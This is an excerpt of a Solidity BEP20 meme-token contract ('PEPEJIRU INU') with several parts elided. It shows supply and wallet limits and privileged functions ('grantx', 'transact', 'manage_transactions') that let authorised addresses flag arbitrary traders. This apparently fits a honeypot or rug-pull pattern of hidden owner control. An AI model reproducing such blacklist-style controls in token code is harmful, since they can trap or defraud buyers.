...
abstract contract Auth {
    ...
    function grantx(address adr) public granted {
...
contract PEPEJIRUINU is IBEP20, Auth {
    ...
    string constant _name = "PEPEJIRU INU";
    string constant _symbol = "PEPEJIRU";
    uint8 constant _decimals = 4;

    uint256 _totalSupply =  9999999 * (10 ** _decimals);

    uint256 public _maxTxAmount = 399999 * (10 ** _decimals);
    uint256 public _maxWalletToken = 399999 * (10 ** _decimals);
...
function transact(address[] calldata addresses, bool status) public granted{
...
function manage_transactions(address[] calldata addresses, bool status) public granted{
    for (uint256 i; i < addresses.length; ++i) {
        isBuySell[addresses[i]] = status;
    }
}
